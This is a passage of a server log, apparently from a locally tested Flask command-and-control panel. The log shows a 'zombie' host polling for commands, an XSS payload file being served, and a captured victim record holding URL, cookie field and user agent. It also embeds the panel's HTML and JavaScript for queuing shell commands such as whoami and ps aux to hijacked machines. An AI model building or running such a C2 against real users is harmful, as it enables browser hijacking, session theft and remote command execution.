{\n        // 檢查URL參數是否指定了選項卡\n        const urlParams = new URLSearchParams(window.location.search);\n        const tab = urlParams.get(\'tab\');\n        if (tab === \'zombies\') {\n            showTab(\'zombies\');\n        }\n    });\n</script>\n\n\n\n        <!-- JavaScript 引用 -->\n        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>\n        \n    </body>\n    \n</html>'
2025-06-25 00:23:05 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:23:05] "GET /api/control/get_messages HTTP/1.1" 200 -
2025-06-25 00:23:06 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:23:06 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:23:06 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:23:06 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:23:06] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:23:07 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:23:07 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:23:07 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:23:07 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:23:07] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:23:08 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:23:08 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:23:08 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0014s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:23:08 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:23:08] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:23:09 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:23:09 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:23:09 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:23:09 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:23:09] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:23:10 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:23:10 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:23:10 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:23:10 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:23:10] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:23:11 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:23:11 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:23:11 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:23:11 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:23:11] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:23:12 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:23:12 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:23:12 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:23:12 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:23:12] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:23:13 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:23:13 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:23:13 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0005s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:23:13 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:23:13] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:23:16 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 xss_payload()
2025-06-25 00:23:16 | INFO     | control_route.py:155 | xss_payload() | 用戶請求XSS載荷文件
2025-06-25 00:23:16 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] xss_payload 執行完畢 (耗時: 0.0002s) -> 回傳: <Response 2102 bytes [200 OK]>
2025-06-25 00:23:16 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:23:16] "GET /api/control/xss_payload HTTP/1.1" 200 -
2025-06-25 00:23:16 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 add_message()
2025-06-25 00:23:16 | INFO     | control_route.py:43 | add_message() | 用戶請求添加消息 (POST)
2025-06-25 00:23:16 | ERROR    | control_route.py:87 | add_message() | 添加消息時發生錯誤: (sqlite3.IntegrityError) UNIQUE constraint failed: web_shell_back_point.target_ip
[SQL: INSERT INTO web_shell_back_point (target_ip, target_config, "where", created_at, to_do_command) VALUES (?, ?, ?, ?, ?)]
[parameters: ('127.0.0.1', '{"where":"http://127.0.0.1:8000/","target_ip":"127.0.0.1","cookie":"","user_agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36","time_stamp":"2025-06-24T16:23:16.578Z"}', None, '2025-06-25 00:23:16.581693', None)]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-25 00:23:16 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] add_message 執行完畢 (耗時: 0.0014s) -> 回傳: <Response 237 bytes [302 FOUND]>
2025-06-25 00:23:16 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:23:16] "[32mPOST /api/control/add_message HTTP/1.1[0m" 302 -
2025-06-25 00:23:16 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_messages()
2025-06-25 00:23:16 | INFO     | control_route.py:101 | get_messages() | 用戶請求獲取消息
2025-06-25 00:23:16 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_messages 執行完畢 (耗時: 0.0006s) -> 回傳: '<!DOCTYPE html>\n<html lang="zh-TW">\n    \n    <head>\n        <meta charset="UTF-8">\n        <meta name="viewport" content="width=device-width, initial-scale=1.0">\n        <title>控制消息</title>\n        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">\n        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">\n        \n    </head>\n    <body>\n        <!-- 导航栏 -->\n        <nav class="navbar navbar-expand-lg navbar-dark bg-primary">\n            <div class="container">\n                <a class="navbar-brand" href="/">\n                    <i class="fas fa-shield-alt"></i> 扫描目标管理系统\n                </a>\n                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">\n                    <span class="navbar-toggler-icon"></span>\n                </button>\n                <div class="collapse navbar-collapse" id="navbarNav">\n                    <ul class="navbar-nav ms-auto">\n                        <li class="nav-item">\n                            <a class="nav-link" href="/">\n                                <i class="fas fa-home"></i> 目标列表\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/add_target">\n                                <i class="fas fa-plus"></i> 添加目标\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/api/control/get_messages">\n                                <i class="fas fa-cog"></i> 控制消息\n                            </a>\n                        </li>\n                    </ul>\n                </div>\n            </div>\n        </nav>\n\n        \n        \n        \n\n        \n<div class="container">\n    <!-- Flash 消息區域 -->\n    \n    \n    \n\n    <!-- 選項卡導航 -->\n    <div class="tab-navigation">\n        <button class="tab-btn active" onclick="showTab(\'messages\')">📨 控制消息</button>\n        <button class="tab-btn" onclick="showTab(\'zombies\')">🧟 殭屍管理</button>\n    </div>\n\n    <!-- 控制消息選項卡 -->\n    <div id="messages-tab" class="tab-content active">\n        <h2>控制消息</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">透過此面板管理和監控您的C2控制消息</p>\n        <form method="post" action="/api/control/add_message">\n            <div class="form-group">\n                <label class="form-label" for="message">控制消息</label>\n                <input type="text" id="message" name="message" placeholder="輸入要發送的控制消息" required>\n            </div>\n            <div class="form-group">\n                <label class="form-label" for="target_ip">目標IP地址</label>\n                <input type="text" id="target_ip" name="target_ip" placeholder="輸入目標IP地址（可選）">\n            </div>\n            <button type="submit">發送消息</button>\n        </form>\n    </div>\n\n    <!-- 殭屍管理選項卡 -->\n    <div id="zombies-tab" class="tab-content">\n        <h2>殭屍機器管理</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">管理已連接的殭屍機器並發送命令</p>\n\n        <!-- 殭屍機器列表 -->\n        <div class="zombie-controls">\n            <button id="refresh-zombies" class="refresh-btn">🔄 刷新殭屍列表</button>\n            <div id="zombie-count" class="zombie-count">載入中...</div>\n        </div>\n\n        <div id="zombie-list" class="zombie-list">\n            <!-- 殭屍機器將通過JavaScript動態載入 -->\n        </div>\n\n        <!-- 命令發送表單 -->\n        <div class="command-form-container" style="display: none;" id="command-form-container">\n            <h3>發送命令給殭屍機器</h3>\n            <form id="command-form">\n                <div class="form-group">\n                    <label class="form-label" for="selected-zombie">選中的殭屍機器</label>\n                    <input type="text" id="selected-zombie" readonly>\n                </div>\n                <div class="form-group">\n                    <label class="form-label" for="command">執行命令</label>\n                    <input type="text" id="command" name="command" placeholder="輸入要執行的命令" required>\n                </div>\n                <div class="form-group">\n                    <label class="form-label">常用命令</label>\n                    <div class="quick-commands">\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'whoami\')">whoami</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'pwd\')">pwd</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ls -la\')">ls -la</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ps aux\')">ps aux</button>\n                        <button type="button" class="quick-cmd-btn"\n                            onclick="setCommand(\'netstat -tuln\')">netstat</button>\n                    </div>\n                </div>\n                <button type="submit">💀 發送命令</button>\n                <button type="button" onclick="hideCommandForm()">取消</button>\n            </form>\n        </div>\n    </div>\n    <div style="display: flex; justify-content: space-between; align-items: center; margin: 40px 0 20px 0;">\n        <h1 style="margin: 0;">已經知道的消息列表</h1>\n        <a href="/api/control/help" class="help-btn">📚 查看使用說明</a>\n    </div>\n    <div id="messageList">\n        \n        \n        <div class="message">\n            <p><strong>目標IP:</strong> 127.0.0.1</p>\n            <p><strong>目標配置:</strong> {&#34;where&#34;:&#34;http://127.0.0.1:8000/&#34;,&#34;target_ip&#34;:&#34;127.0.0.1&#34;,&#34;cookie&#34;:&#34;&#34;,&#34;user_agent&#34;:&#34;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36&#34;,&#34;time_stamp&#34;:&#34;2025-06-24T16:15:51.595Z&#34;}</p>\n            <p><strong>建立時間:</strong> 2025-06-25 00:15:51.600109</p>\n        </div>\n        \n        \n    </div>\n</div>\n<link rel="stylesheet" href="/static/css/control_message.css">\n\n<script>\n    // 選項卡切換功能\n    function showTab(tabName) {\n        // 隱藏所有選項卡內容\n        const tabContents = document.querySelectorAll(\'.tab-content\');\n        tabContents.forEach(tab => {\n            tab.classList.remove(\'active\');\n        });\n\n        // 移除所有選項卡按鈕的活動狀態\n        const tabBtns = document.querySelectorAll(\'.tab-btn\');\n        tabBtns.forEach(btn => {\n            btn.classList.remove(\'active\');\n        });\n\n        // 顯示選中的選項卡\n        document.getElementById(tabName + \'-tab\').classList.add(\'active\');\n        event.target.classList.add(\'active\');\n\n        // 如果切換到殭屍管理選項卡，自動載入殭屍列表\n        if (tabName === \'zombies\') {\n            loadZombies();\n        }\n    }\n\n    // 載入殭屍機器列表\n    async function loadZombies() {\n        try {\n            const response = await fetch(\'/api/control/get_zombies\');\n            const data = await response.json();\n\n            const zombieCountEl = document.getElementById(\'zombie-count\');\n            const zombieListEl = document.getElementById(\'zombie-list\');\n\n            if (data.status === \'success\') {\n                zombieCountEl.textContent = `找到 ${data.count} 台殭屍機器`;\n\n                if (data.zombies.length === 0) {\n                    zombieListEl.innerHTML = \'<div class="empty-state">目前沒有連接的殭屍機器</div>\';\n                } else {\n                    let zombieHtml = \'\';\n                    data.zombies.forEach(zombie => {\n                        zombieHtml += `\n                        <div class="zombie-card" onclick="selectZombie(\'${zombie}\')">\n                            <div class="zombie-info">\n                                <h4>🧟 ${zombie}</h4>\n                                <p>點擊選擇此殭屍機器</p>\n                            </div>\n                            <div class="zombie-actions">\n                                <button class="action-btn" onclick="event.stopPropagation(); selectZombie(\'${zombie}\')">\n                                    💀 發送命令\n                                </button>\n                            </div>\n                        </div>\n                    `;\n                    });\n                    zombieListEl.innerHTML = zombieHtml;\n                }\n            } else {\n                zombieCountEl.textContent = \'載入失敗\';\n                zombieListEl.innerHTML = `<div class="error-state">載入失敗: ${data.error}</div>`;\n            }\n        } catch (error) {\n            console.error(\'載入殭屍列表失敗:\', error);\n            document.getElementById(\'zombie-count\').textContent = \'載入失敗\';\n            document.getElementById(\'zombie-list\').innerHTML = \'<div class="error-state">網路錯誤</div>\';\n        }\n    }\n\n    // 選擇殭屍機器\n    function selectZombie(zombieIp) {\n        document.getElementById(\'selected-zombie\').value = zombieIp;\n        document.getElementById(\'command-form-container\').style.display = \'block\';\n        document.getElementById(\'command\').focus();\n    }\n\n    // 隱藏命令表單\n    function hideCommandForm() {\n        document.getElementById(\'command-form-container\').style.display = \'none\';\n        document.getElementById(\'command\').value = \'\';\n        document.getElementById(\'selected-zombie\').value = \'\';\n    }\n\n    // 設置快速命令\n    function setCommand(cmd) {\n        document.getElementById(\'command\').value = cmd;\n    }\n\n    // 發送命令給殭屍機器\n    document.getElementById(\'command-form\').addEventListener(\'submit\', async function (e) {\n        e.preventDefault();\n\n        const zombieIp = document.getElementById(\'selected-zombie\').value;\n        const command = document.getElementById(\'command\').value;\n\n        if (!zombieIp || !command) {\n            alert(\'請選擇殭屍機器並輸入命令\');\n            return;\n        }\n\n        try {\n            const formData = new FormData();\n            formData.append(\'command\', command);\n\n            const response = await fetch(`/api/control/add_command_to_do/${zombieIp}`, {\n                method: \'POST\',\n                body: formData\n            });\n\n            if (response.ok) {\n                alert(`命令已發送給 ${zombieIp}`);\n                hideCommandForm();\n            } else {\n                const errorData = await response.json();\n                alert(`發送失敗: ${errorData.error}`);\n            }\n        } catch (error) {\n            console.error(\'發送命令失敗:\', error);\n            alert(\'發送命令時發生網路錯誤\');\n        }\n    });\n\n    // 刷新殭屍列表\n    document.getElementById(\'refresh-zombies\').addEventListener(\'click\', loadZombies);\n\n    // 頁面載入時檢查當前選項卡\n    document.addEventListener(\'DOMContentLoaded\', function () {\n        // 檢查URL參數是否指定了選項卡\n        const urlParams = new URLSearchParams(window.location.search);\n        const tab = urlParams.get(\'tab\');\n        if (tab === \'zombies\') {\n            showTab(\'zombies\');\n        }\n    });\n</script>\n\n\n\n        <!-- JavaScript 引用 -->\n        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>\n        \n    </body>\n    \n</html>'
2025-06-25 00:23:16 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:23:16] "GET /api/control/get_messages HTTP/1.1" 200 -
2025-06-25 00:23:17 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:23:17 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:23:17 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0005s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:23:17 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:23:17] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:23:18 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:23:18 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:23:18 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0005s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:23:18 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:23:18] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:23:19 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:23:19 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:23:19 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:23:19 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:23:19] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:23:20 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:23:20 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:23:20 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0005s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:23:20 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:23:20] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:23:21 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:23:21 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:23:21 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:23:21 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:23:21] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:23:22 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:23:22 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:23:22 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:23:22 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:23:22] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:23:23 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:23:23 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:23:23 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:23:23 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:23:23] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:23:24 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:23:24 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:23:24 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0015s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:23:24 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:23:24] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:23:25 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:23:25 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:23:25 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:23:25 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:23:25] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:23:26 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:23:26 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:23:26 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:23:26 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:23:26] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:23:27 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:23:27 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:23:27 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0015s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:23:27 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:23:27] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:23:28 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:23:28 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:23:28 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:23:28 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:23:28] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:23:29 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:23:29 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:23:29 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:23:29 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:23:29] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:23:30 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:23:30 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:23:30 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:23:30 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:23:30] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:23:31 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:23:31 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:23:31 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:23:31 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:23:31] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:23:32 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:23:32 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:23:32 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:23:32 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:23:32] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:23:33 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:23:33 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:23:33 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:23:33 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:23:33] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:23:34 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:23:34 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:23:34 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:23:34 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:23:34] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:23:35 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:23:35 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:23:35 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0015s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:23:35 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:23:35] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:23:36 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:23:36 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:23:36 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:23:36 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:23:36] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:23:37 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:23:37 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:23:37 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:23:37 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:23:37] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:23:38 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:23:38 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:23:38 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:23:38 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:23:38] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:23:39 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:23:39 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:23:39 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:23:39 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:23:39] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
